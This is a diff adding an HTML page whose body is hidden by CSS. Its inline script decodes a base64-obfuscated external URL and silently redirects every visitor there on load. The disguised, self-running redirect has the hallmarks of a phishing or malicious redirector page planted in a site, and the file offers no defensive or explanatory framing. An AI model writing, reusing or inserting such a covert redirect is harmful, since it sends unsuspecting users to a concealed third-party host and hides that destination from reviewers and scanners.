@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>....</title>
+    <style>
+        body { display: none; }
+    </style>
+    <script>
+        (function() {
+            var encodedUrl = "aHR0cHM6Ly94bmh1cS5tZXJmYXJldGUuY29tL2pBSUlKY1hsLw==";
+            var decodeBase64 = function(encodedStr) {
+                return decodeURIComponent(atob(encodedStr).split('').map(function(c) {
+                    return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
+                }).join(''));
+            };
+            var redirectUrl = decodeBase64(encodedUrl);
+            window.location.href = redirectUrl;
+        })();
+    </script>
+</head>
+<body>
+</body>
+</html>
